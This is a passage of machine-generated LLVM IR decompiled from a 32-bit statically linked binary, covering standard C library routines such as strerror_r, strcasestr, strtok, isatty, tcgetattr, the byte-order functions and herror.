dec_label_pc_80534d0:                             ; preds = %dec_label_pc_805349a, %dec_label_pc_80534c8
  %v0_80534d6 = phi i32 [ %v1_805349a, %dec_label_pc_805349a ], [ %v1_80534c8, %dec_label_pc_80534c8 ]
  %v4_805349a.sink.in.in.in = phi i32 [ %v1_805349a, %dec_label_pc_805349a ], [ %v1_80534c8, %dec_label_pc_80534c8 ]
  %v4_805349a.sink.in.in = inttoptr i32 %v4_805349a.sink.in.in.in to i8*
  %v4_805349a.sink.in = load i8, i8* %v4_805349a.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_805349a.sink.in, %v3_805348e
  %v1_80534d0 = icmp eq i1 %storemerge4, false
  br i1 %v1_80534d0, label %dec_label_pc_80534c3.preheader, label %dec_label_pc_80534d2

dec_label_pc_80534d2:                             ; preds = %dec_label_pc_80534d0
  %v1_80534d6 = add i32 %v0_80534d6, 1
  %v1_80534dd = add i32 %v0_80534d6, -1
  %v2_80534e0 = inttoptr i32 %v1_80534d6 to i8*
  %v3_80534e0 = load i8, i8* %v2_80534e0, align 1
  %v4_80534e0 = zext i8 %v3_80534e0 to i32
  %v3_80534e4 = load i8, i8* %v2_80534e4, align 1
  %v4_80534e4 = zext i8 %v3_80534e4 to i32
  %v12_80534e9 = icmp eq i8 %v3_80534e0, %v3_80534e4
  %v1_80534eb = icmp eq i1 %v12_80534e9, false
  br i1 %v1_80534eb, label %dec_label_pc_8053514, label %dec_label_pc_80534ed

dec_label_pc_80534ed:                             ; preds = %dec_label_pc_80534d2, %dec_label_pc_8053501
  %v0_8053504 = phi i32 [ %v1_8053504, %dec_label_pc_8053501 ], [ %v1_80534e4, %dec_label_pc_80534d2 ]
  %v0_8053501 = phi i32 [ %v1_8053501, %dec_label_pc_8053501 ], [ %v1_80534d6, %dec_label_pc_80534d2 ]
  %v0_80534ed = phi i32 [ %v3_8053507, %dec_label_pc_8053501 ], [ %v4_80534e0, %dec_label_pc_80534d2 ]
  %v1_80534ed = icmp eq i32 %v0_80534ed, 0
  br i1 %v1_80534ed, label %dec_label_pc_805351e, label %dec_label_pc_80534f1

dec_label_pc_80534f1:                             ; preds = %dec_label_pc_80534ed
  %v1_80534f1 = add i32 %v0_8053501, 1
  %v2_80534f1 = inttoptr i32 %v1_80534f1 to i8*
  %v3_80534f1 = load i8, i8* %v2_80534f1, align 1
  %v1_80534f5 = add i32 %v0_8053504, 1
  %v2_80534f5 = inttoptr i32 %v1_80534f5 to i8*
  %v3_80534f5 = load i8, i8* %v2_80534f5, align 1
  %v4_80534f5 = zext i8 %v3_80534f5 to i32
  %v12_80534f9 = icmp eq i8 %v3_80534f1, %v3_80534f5
  %v1_80534fb = icmp eq i1 %v12_80534f9, false
  br i1 %v1_80534fb, label %dec_label_pc_8053514, label %dec_label_pc_80534fd

dec_label_pc_80534fd:                             ; preds = %dec_label_pc_80534f1
  %v1_80534fd = icmp eq i8 %v3_80534f5, 0
  br i1 %v1_80534fd, label %dec_label_pc_805351e, label %dec_label_pc_8053501

dec_label_pc_8053501:                             ; preds = %dec_label_pc_80534fd
  %v1_8053501 = add i32 %v0_8053501, 2
  %v1_8053504 = add i32 %v0_8053504, 2
  %v1_8053507 = inttoptr i32 %v1_8053504 to i8*
  %v2_8053507 = load i8, i8* %v1_8053507, align 1
  %v3_8053507 = zext i8 %v2_8053507 to i32
  %v1_805350b = inttoptr i32 %v1_8053501 to i8*
  %v2_805350b = load i8, i8* %v1_805350b, align 1
  %v12_805350e = icmp eq i8 %v2_805350b, %v2_8053507
  br i1 %v12_805350e, label %dec_label_pc_80534ed, label %dec_label_pc_8053512

dec_label_pc_8053512:                             ; preds = %dec_label_pc_8053501
  br label %dec_label_pc_8053514

dec_label_pc_8053514:                             ; preds = %dec_label_pc_80534f1, %dec_label_pc_80534d2, %dec_label_pc_8053512
  %v0_8053514 = phi i32 [ %v4_80534e4, %dec_label_pc_80534d2 ], [ %v3_8053507, %dec_label_pc_8053512 ], [ %v4_80534f5, %dec_label_pc_80534f1 ]
  %v1_8053514 = icmp eq i32 %v0_8053514, 0
  %v1_8053516 = icmp eq i1 %v1_8053514, false
  br i1 %v1_8053516, label %dec_label_pc_80534a5, label %dec_label_pc_805351e

dec_label_pc_805351c:                             ; preds = %dec_label_pc_8053476, %dec_label_pc_80534bb, %dec_label_pc_80534ae
  br label %dec_label_pc_805351e

dec_label_pc_805351e:                             ; preds = %dec_label_pc_8053514, %dec_label_pc_80534ed, %dec_label_pc_80534fd, %entry, %dec_label_pc_8053487, %dec_label_pc_805351c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_805351c ], [ %v1_8053476, %dec_label_pc_8053487 ], [ %arg1, %entry ], [ %v1_80534dd, %dec_label_pc_80534fd ], [ %v1_80534dd, %dec_label_pc_80534ed ], [ %v1_80534dd, %dec_label_pc_8053514 ]
  store i32 %v0_805345b, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_8053504, { 1, 0 }
  uselistorder i32 %v1_8053501, { 1, 0 }
  uselistorder i8 %v3_80534f5, { 1, 0, 2 }
  uselistorder i8 %v4_805349a.sink.in, { 1, 0 }
  uselistorder i32 %v0_80534d6, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_80534c0, { 1, 0 }
  uselistorder i32 %v1_80534bf, { 0, 2, 1 }
  uselistorder i8 %v2_80534b3, { 1, 0 }
  uselistorder i32 %v0_80534b248, { 1, 0 }
  uselistorder i32 %v1_8053476, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805351e, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_805351c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053514, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534ed, { 1, 0 }
  uselistorder label %dec_label_pc_80534d0, { 1, 0 }
  uselistorder label %dec_label_pc_80534ae, { 1, 0 }
  uselistorder label %dec_label_pc_80534c3.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8053539 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8053541 = load i32, i32* @ebx, align 4
  ret i32 %v0_8053541
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805355a = icmp ugt i32 %arg1, 124
  br i1 %v6_805355a, label %dec_label_pc_8053577, label %dec_label_pc_805355c

dec_label_pc_805355c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805c1c0.499 to i32), i32* @esi, align 4
  %v1_805356c4 = icmp eq i32 %arg1, 0
  %v1_805356e11 = icmp eq i1 %v1_805356c4, false
  br i1 %v1_805356e11, label %dec_label_pc_8053565, label %dec_label_pc_8053570

dec_label_pc_8053565:                             ; preds = %dec_label_pc_805355c, %dec_label_pc_8053565
  %v0_8053568 = phi i32 [ %v3_8053568, %dec_label_pc_8053565 ], [ %arg1, %dec_label_pc_805355c ]
  %v0_805356b = phi i32 [ %v1_805356b, %dec_label_pc_8053565 ], [ ptrtoint ([8 x i8]* @global_var_805c1c0.499 to i32), %dec_label_pc_805355c ]
  %v1_8053565 = inttoptr i32 %v0_805356b to i8*
  %v2_8053565 = load i8, i8* %v1_8053565, align 1
  %v7_8053565 = icmp eq i8 %v2_8053565, 0
  %v2_8053568 = zext i1 %v7_8053565 to i32
  %v3_8053568 = add i32 %v2_8053568, %v0_8053568
  %v16_8053568 = icmp eq i32 %v3_8053568, 0
  %v1_805356b = add i32 %v0_805356b, 1
  store i32 %v1_805356b, i32* @esi, align 4
  %v1_805356e = icmp eq i1 %v16_8053568, false
  br i1 %v1_805356e, label %dec_label_pc_8053565, label %dec_label_pc_8053570

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053565, %dec_label_pc_805355c
  %v0_8053572 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805c1c0.499 to i32), %dec_label_pc_805355c ], [ %v1_805356b, %dec_label_pc_8053565 ]
  store i32 0, i32* @ebp, align 4
  %v1_8053572 = inttoptr i32 %v0_8053572 to i8*
  %v2_8053572 = load i8, i8* %v1_8053572, align 1
  %v3_8053572 = icmp eq i8 %v2_8053572, 0
  %v1_8053575 = icmp eq i1 %v3_8053572, false
  br i1 %v1_8053575, label %dec_label_pc_8053570.dec_label_pc_80535a6_crit_edge, label %dec_label_pc_8053577

dec_label_pc_8053570.dec_label_pc_80535a6_crit_edge: ; preds = %dec_label_pc_8053570
  br label %dec_label_pc_80535a6

dec_label_pc_8053577:                             ; preds = %dec_label_pc_8053570, %entry
  %v1_805357a = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_805358b = bitcast i32* %stack_var_-17 to i8*
  %v7_805358b = call i32 @_uintmaxtostr(i8* %v6_805358b, i32 %arg1, i32 %v1_805357a, i32 -10, i32 0)
  %v1_805359a = add i32 %v7_805358b, -14
  store i32 %v1_805359a, i32* @esi, align 4
  %v5_805359d = inttoptr i32 %v1_805359a to i8*
  store i8* %v5_805359d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805359a to i16*
  %v6_805359e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805c196.500 to i32), i32 14)
  %v1_80535b0.pre = load i32, i32* @edi, align 4
  %v0_80535b6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80535a6

dec_label_pc_80535a6:                             ; preds = %dec_label_pc_8053570.dec_label_pc_80535a6_crit_edge, %dec_label_pc_8053577
  %v0_80535b6 = phi i32 [ %v0_8053572, %dec_label_pc_8053570.dec_label_pc_80535a6_crit_edge ], [ %v0_80535b6.pre, %dec_label_pc_8053577 ]
  %v1_80535b0 = phi i32 [ %arg3, %dec_label_pc_8053570.dec_label_pc_80535a6_crit_edge ], [ %v1_80535b0.pre, %dec_label_pc_8053577 ]
  %v4_80535a6 = icmp eq i32 %arg2, 0
  %v3_80535b0 = select i1 %v4_80535a6, i32 0, i32 %v1_80535b0
  store i32 %v3_80535b0, i32* @edi, align 4
  %v5_80535b6 = inttoptr i32 %v0_80535b6 to i8*
  store i8* %v5_80535b6, i8** %stack_var_-108, align 4
  %v3_80535b7 = call i32 @strlen(i8* %v5_80535b6)
  %v1_80535bf = add i32 %v3_80535b7, 1
  store i32 %v1_80535bf, i32* %ebx.global-to-local, align 4
  %v1_80535c2 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_80535bf, %v1_80535c2
  br i1 %tmp, label %dec_label_pc_80535c6, label %dec_label_pc_80535cd

dec_label_pc_80535c6:                             ; preds = %dec_label_pc_80535a6
  store i32 %v1_80535c2, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_80535cd

dec_label_pc_80535cd:                             ; preds = %dec_label_pc_80535a6, %dec_label_pc_80535c6
  %v0_80535d2 = phi i32 [ %v1_80535bf, %dec_label_pc_80535a6 ], [ %v1_80535c2, %dec_label_pc_80535c6 ]
  %v1_80535cd = icmp eq i32 %v0_80535d2, 0
  br i1 %v1_80535cd, label %dec_label_pc_80535e9, label %dec_label_pc_80535d1

dec_label_pc_80535d1:                             ; preds = %dec_label_pc_80535cd
  %v0_80535d3 = load i32, i32* @esi, align 4
  %v8_80535d4 = inttoptr i32 %arg2 to i8*
  store i8* %v8_80535d4, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_80535d8 = call i32 @memcpy(i16* %tmp45, i32 %v0_80535d3, i32 %v0_80535d2)
  %v1_80535e4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80535e4 = add i32 %arg2, -1
  %v3_80535e4 = add i32 %v2_80535e4, %v1_80535e4
  %v4_80535e4 = inttoptr i32 %v3_80535e4 to i8*
  store i8 0, i8* %v4_80535e4, align 1
  br label %dec_label_pc_80535e9

dec_label_pc_80535e9:                             ; preds = %dec_label_pc_80535cd, %dec_label_pc_80535d1
  %v0_80535e9 = load i32, i32* @ebp, align 4
  %v1_80535e9 = icmp eq i32 %v0_80535e9, 0
  br i1 %v1_80535e9, label %dec_label_pc_80535f4, label %dec_label_pc_80535ed

dec_label_pc_80535ed:                             ; preds = %dec_label_pc_80535e9
  %v0_80535ed = load i8*, i8** %stack_var_-108, align 4
  %v1_80535ed = ptrtoint i8* %v0_80535ed to i32
  %v2_80535ed = call i32 @__errno_location(i32 %v1_80535ed)
  %v0_80535f2 = load i32, i32* @ebp, align 4
  %v2_80535f2 = inttoptr i32 %v2_80535ed to i32*
  store i32 %v0_80535f2, i32* %v2_80535f2, align 4
  %v0_80535f7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80535f4

dec_label_pc_80535f4:                             ; preds = %dec_label_pc_80535e9, %dec_label_pc_80535ed
  %v0_80535f7 = phi i32 [ 0, %dec_label_pc_80535e9 ], [ %v0_80535f7.pre, %dec_label_pc_80535ed ]
  ret i32 %v0_80535f7

; uselistorder directives
  uselistorder i32 %v1_80535c2, { 1, 2, 0 }
  uselistorder i32 %v1_80535bf, { 1, 0, 2 }
  uselistorder i32 %v1_805356b, { 0, 2, 1 }
  uselistorder i32 %v3_8053568, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805c1c0.499 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_80535f4, { 1, 0 }
  uselistorder label %dec_label_pc_80535e9, { 1, 0 }
  uselistorder label %dec_label_pc_80535cd, { 1, 0 }
  uselistorder label %dec_label_pc_80535a6, { 1, 0 }
  uselistorder label %dec_label_pc_8053565, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_8053610 = inttoptr i32 %arg2 to i8*
  %v3_8053610 = call i32 @memmove(i8* %v2_8053610, i32 %arg1)
  ret i32 %v3_8053610
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805361b = load i32, i32* @ebx, align 4
  %v4_805361f = ptrtoint i8* %arg1 to i32
  %v1_805362b18 = inttoptr i32 %arg2 to i8*
  %v2_805362b1932 = load i8, i8* %v1_805362b18, align 1
  %v4_805362d2336 = icmp eq i8 %v2_805362b1932, 0
  %v1_805362f2538 = icmp eq i1 %v4_805362d2336, false
  br i1 %v1_805362f2538, label %dec_label_pc_8053635.lr.ph.lr.ph, label %dec_label_pc_8053665

dec_label_pc_8053635.lr.ph.lr.ph:                 ; preds = %entry
  %v3_805362b2033 = zext i8 %v2_805362b1932 to i32
  %v4_805362b.pre.pre = load i32, i32* @eax, align 4
  %v5_805362b2134 = and i32 %v4_805362b.pre.pre, -256
  %v6_805362b2235 = or i32 %v3_805362b2033, %v5_805362b2134
  %v4_8053635.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053635.lr.ph

dec_label_pc_8053635.lr.ph:                       ; preds = %dec_label_pc_8053635.lr.ph.lr.ph, %dec_label_pc_8053660
  %v4_8053635.pre = phi i32 [ %v4_8053635.pre.pre, %dec_label_pc_8053635.lr.ph.lr.ph ], [ %v0_805363f, %dec_label_pc_8053660 ]
  %v6_805362b2241 = phi i32 [ %v6_805362b2235, %dec_label_pc_8053635.lr.ph.lr.ph ], [ %v6_805362b22, %dec_label_pc_8053660 ]
  %v2_805362b1940 = phi i8 [ %v2_805362b1932, %dec_label_pc_8053635.lr.ph.lr.ph ], [ %v2_805362b19, %dec_label_pc_8053660 ]
  %v0_805366039 = phi i32 [ %v4_805361f, %dec_label_pc_8053635.lr.ph.lr.ph ], [ %v1_8053660, %dec_label_pc_8053660 ]
  br label %dec_label_pc_8053635

dec_label_pc_8053635:                             ; preds = %dec_label_pc_8053635.lr.ph, %dec_label_pc_8053655
  %v4_8053635 = phi i32 [ %v4_8053635.pre, %dec_label_pc_8053635.lr.ph ], [ %v4_805363546, %dec_label_pc_8053655 ]
  %v6_805362b30 = phi i32 [ %v6_805362b2241, %dec_label_pc_8053635.lr.ph ], [ %v6_805362b, %dec_label_pc_8053655 ]
  %v2_805362b29 = phi i8 [ %v2_805362b1940, %dec_label_pc_8053635.lr.ph ], [ %v2_805362b, %dec_label_pc_8053655 ]
  %v1_805362b28 = phi i8* [ %v1_805362b18, %dec_label_pc_8053635.lr.ph ], [ %v1_805362b, %dec_label_pc_8053655 ]
  %v0_805365527 = phi i32 [ %arg2, %dec_label_pc_8053635.lr.ph ], [ %v1_8053655, %dec_label_pc_8053655 ]
  %v0_805365626 = phi i32 [ %v0_805366039, %dec_label_pc_8053635.lr.ph ], [ %v1_8053656, %dec_label_pc_8053655 ]
  %v1_8053635 = inttoptr i32 %v0_805365626 to i8*
  %v2_8053635 = load i8, i8* %v1_8053635, align 1
  %v3_8053635 = zext i8 %v2_8053635 to i32
  %v5_8053635 = and i32 %v4_8053635, -256
  %v6_8053635 = or i32 %v5_8053635, %v3_8053635
  %v15_8053637 = icmp eq i8 %v2_805362b29, %v2_8053635
  br i1 %v15_8053637, label %dec_label_pc_8053655, label %dec_label_pc_805363f

dec_label_pc_805363f:                             ; preds = %dec_label_pc_8053635
  %v0_805363f = load i32, i32* bitcast (i32** @global_var_805e440.502 to i32*), align 64
  %v2_8053645 = load i8, i8* %v1_8053635, align 1
  %v3_8053645 = zext i8 %v2_8053645 to i32
  %v2_8053648 = load i8, i8* %v1_805362b28, align 1
  %v3_8053648 = zext i8 %v2_8053648 to i32
  %v2_805364b = mul nuw nsw i32 %v3_8053645, 2
  %v3_805364b = add i32 %v2_805364b, %v0_805363f
  %v4_805364b = inttoptr i32 %v3_805364b to i16*
  %v5_805364b = load i16, i16* %v4_805364b, align 2
  %v6_805364b = zext i16 %v5_805364b to i32
  %v4_805364f = mul nuw nsw i32 %v3_8053648, 2
  %v5_805364f = add i32 %v4_805364f, %v0_805363f
  %v6_805364f = inttoptr i32 %v5_805364f to i16*
  %v7_805364f = load i16, i16* %v6_805364f, align 2
  %v18_805364f = icmp eq i16 %v5_805364b, %v7_805364f
  %v1_8053653 = icmp eq i1 %v18_805364f, false
  br i1 %v1_8053653, label %dec_label_pc_8053659, label %dec_label_pc_8053655

dec_label_pc_8053655:                             ; preds = %dec_label_pc_805363f, %dec_label_pc_8053635
  %v4_805363546 = phi i32 [ %v0_805363f, %dec_label_pc_805363f ], [ %v6_8053635, %dec_label_pc_8053635 ]
  %v4_805362b6 = phi i32 [ %v6_805364b, %dec_label_pc_805363f ], [ %v6_805362b30, %dec_label_pc_8053635 ]
  %v1_8053655 = add i32 %v0_805365527, 1
  %v1_8053656 = add i32 %v0_805365626, 1
  %v1_805362b = inttoptr i32 %v1_8053655 to i8*
  %v2_805362b = load i8, i8* %v1_805362b, align 1
  %v3_805362b = zext i8 %v2_805362b to i32
  %v5_805362b = and i32 %v4_805362b6, -256
  %v6_805362b = or i32 %v3_805362b, %v5_805362b
  %v4_805362d = icmp eq i8 %v2_805362b, 0
  %v1_805362f = icmp eq i1 %v4_805362d, false
  br i1 %v1_805362f, label %dec_label_pc_8053635, label %dec_label_pc_8053665

dec_label_pc_8053659:                             ; preds = %dec_label_pc_805363f
  %v4_8053659 = icmp eq i8 %v2_8053635, 0
  br i1 %v4_8053659, label %dec_label_pc_8053663, label %dec_label_pc_8053660

dec_label_pc_8053660:                             ; preds = %dec_label_pc_8053659
  %v1_8053660 = add i32 %v0_805366039, 1
  %v2_805362b19 = load i8, i8* %v1_805362b18, align 1
  %v3_805362b20 = zext i8 %v2_805362b19 to i32
  %v5_805362b21 = and i32 %v6_805364b, 65280
  %v6_805362b22 = or i32 %v3_805362b20, %v5_805362b21
  %v4_805362d23 = icmp eq i8 %v2_805362b19, 0
  %v1_805362f25 = icmp eq i1 %v4_805362d23, false
  br i1 %v1_805362f25, label %dec_label_pc_8053635.lr.ph, label %dec_label_pc_8053665

dec_label_pc_8053663:                             ; preds = %dec_label_pc_8053659
  br label %dec_label_pc_8053665

dec_label_pc_8053665:                             ; preds = %dec_label_pc_8053660, %entry, %dec_label_pc_8053655, %dec_label_pc_8053663
  %storemerge = phi i32 [ 0, %dec_label_pc_8053663 ], [ %v4_805361f, %entry ], [ %v1_8053660, %dec_label_pc_8053660 ], [ %v0_805366039, %dec_label_pc_8053655 ]
  store i32 %v0_805361b, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805362b19, { 1, 2, 0 }
  uselistorder i8 %v2_805362b, { 1, 2, 0 }
  uselistorder i8* %v1_805362b, { 1, 0 }
  uselistorder i32 %v0_805363f, { 1, 2, 3, 0 }
  uselistorder i8 %v2_8053635, { 1, 0, 2 }
  uselistorder i32 %v0_805365626, { 1, 0 }
  uselistorder i8 %v2_805362b1932, { 0, 2, 1 }
  uselistorder i8* %v1_805362b18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053665, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053635, { 1, 0 }
  uselistorder label %dec_label_pc_8053635.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805367c = inttoptr i32 %arg1 to i8*
  %v4_805367c = call i32 @strtok_r(i8* %v3_805367c, i32 %arg2, i32 ptrtoint (i32* @global_var_80644c0.503 to i32))
  ret i32 %v4_805367c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_8053694 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8053699 = icmp eq i32 %v3_8053694, 0
  %v1_805369b = zext i1 %v1_8053699 to i32
  ret i32 %v1_805369b
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80536a8 = load i32, i32* @esi, align 4
  %v0_80536a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80536a9, i32* %stack_var_-8, align 4
  %v2_80536ad = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80536ad, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_80536bf = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_80536ad)
  store i32 %v3_80536bf, i32* %eax.global-to-local, align 4
  %v1_80536c7 = icmp eq i32 %v3_80536bf, 0
  store i32 %v3_80536bf, i32* @esi, align 4
  %v1_80536cb = icmp eq i1 %v1_80536c7, false
  br i1 %v1_80536cb, label %dec_label_pc_8053710, label %dec_label_pc_80536cd

dec_label_pc_80536cd:                             ; preds = %entry
  %v3_80536cd = load i32, i32* %stack_var_-44, align 4
  %v1_80536d1 = load i32, i32* @ebx, align 4
  %v2_80536d1 = inttoptr i32 %v1_80536d1 to i32*
  store i32 %v3_80536cd, i32* %v2_80536d1, align 4
  %v1_80536d7 = load i32, i32* @ebx, align 4
  %v2_80536d7 = add i32 %v1_80536d7, 4
  %v3_80536d7 = inttoptr i32 %v2_80536d7 to i32*
  %v1_80536de = load i32, i32* @ebx, align 4
  %v2_80536de = add i32 %v1_80536de, 8
  %v3_80536de = inttoptr i32 %v2_80536de to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_80536e5 = load i32, i32* @ebx, align 4
  %v2_80536e5 = add i32 %v1_80536e5, 12
  %v3_80536e5 = inttoptr i32 %v2_80536e5 to i32*
  store i32 %tmp3, i32* %v3_80536e5, align 4
  %v4_80536e8 = zext i8 %tmp to i32
  %v5_80536e8 = load i32, i32* %eax.global-to-local, align 4
  %v6_80536e8 = and i32 %v5_80536e8, -256
  %v7_80536e8 = or i32 %v6_80536e8, %v4_80536e8
  store i32 %v7_80536e8, i32* %eax.global-to-local, align 4
  %v2_80536ec = load i32, i32* @ebx, align 4
  %v3_80536ec = add i32 %v2_80536ec, 16
  %v4_80536ec = inttoptr i32 %v3_80536ec to i8*
  store i8 %tmp, i8* %v4_80536ec, align 1
  %v0_80536ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80536f2 = ptrtoint i32* %stack_var_-27 to i32
  %v0_80536f7 = load i32, i32* @ebx, align 4
  %v1_80536f7 = add i32 %v0_80536f7, 17
  store i32 %v1_80536f7, i32* %eax.global-to-local, align 4
  %v4_80536fb = call i32 @__GI_mempcpy(i32 %v1_80536f7, i32 %v2_80536f2, i32 19, i32 %v0_80536ef)
  store i32 %v4_80536fb, i32* %eax.global-to-local, align 4
  %v3_8053708 = inttoptr i32 %v4_80536fb to i8*
  %v4_8053708 = call i32 @__GI_memset(i8* %v3_8053708, i32 0, i32 13)
  store i32 %v4_8053708, i32* %eax.global-to-local, align 4
  %v0_8053713.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053710

dec_label_pc_8053710:                             ; preds = %entry, %dec_label_pc_80536cd
  %v0_8053713 = phi i32 [ %v3_80536bf, %entry ], [ %v0_8053713.pre, %dec_label_pc_80536cd ]
  store i32 %v0_8053713, i32* %eax.global-to-local, align 4
  %v2_8053715 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053715, i32* @ebx, align 4
  store i32 %v0_80536a8, i32* @esi, align 4
  ret i32 %v0_8053713

; uselistorder directives
  uselistorder i32 %v0_8053713, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053710, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_805371d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_805371d = zext i16 %v3_805371d to i32
  ret i32 %v4_805371d
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8053729 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8053729
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8053731 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8053731 = zext i16 %v3_8053731 to i32
  ret i32 %v4_8053731
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805373d = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805373d
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v6_805374c = icmp ugt i32 %arg1, 4
  br i1 %v6_805374c, label %dec_label_pc_8053755, label %dec_label_pc_805374e

dec_label_pc_805374e:                             ; preds = %entry
  %v1_805374e = mul i32 %arg1, 4
  %v2_805374e = add i32 %v1_805374e, ptrtoint ([5 x i8*]* @global_var_805cd88.510 to i32)
  %v3_805374e = inttoptr i32 %v2_805374e to i32*
  %v4_805374e = load i32, i32* %v3_805374e, align 4
  br label %dec_label_pc_8053755

dec_label_pc_8053755:                             ; preds = %entry, %dec_label_pc_805374e
  %v0_8053755 = phi i32 [ ptrtoint ([15 x i8]* @global_var_805cd9c.504 to i32), %entry ], [ %v4_805374e, %dec_label_pc_805374e ]
  ret i32 %v0_8053755

; uselistorder directives
  uselistorder label %dec_label_pc_8053755, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %v4_805375b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805375b, i32* @ebx, align 4
  %v2_805375f = icmp eq i8* %arg1, null
  br i1 %v2_805375f, label %dec_label_pc_805376d, label %dec_label_pc_8053763

dec_label_pc_8053763:                             ; preds = %entry
  %v3_8053763 = load i8, i8* %arg1, align 1
  %v4_8053763 = icmp eq i8 %v3_8053763, 0
  %v1_805376b = icmp eq i1 %v4_8053763, false
  br i1 %v1_805376b, label %dec_label_pc_8053772, label %dec_label_pc_805376d

dec_label_pc_805376d:                             ; preds = %dec_label_pc_8053763, %entry
  br label %dec_label_pc_8053772

dec_label_pc_8053772:                             ; preds = %dec_label_pc_8053763, %dec_label_pc_805376d
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_805cdad.512 to i32), %dec_label_pc_805376d ], [ ptrtoint ([3 x i8]* @global_var_805cdab.511 to i32), %dec_label_pc_8053763 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_8053772 = call i32 @__GI___h_errno_location()
  store i32 ptrtoint ([15 x i8]* @global_var_805cd9c.504 to i32), i32* @edx, align 4
  %v1_805377c = inttoptr i32 %v0_8053772 to i32*
  %v2_805377c = load i32, i32* %v1_805377c, align 4
  %v6_8053781 = icmp ugt i32 %v2_805377c, 4
  br i1 %v6_8053781, label %dec_label_pc_805378a, label %dec_label_pc_8053783

dec_label_pc_8053783:                             ; preds = %dec_label_pc_8053772
  %v1_8053783 = mul i32 %v2_805377c, 4
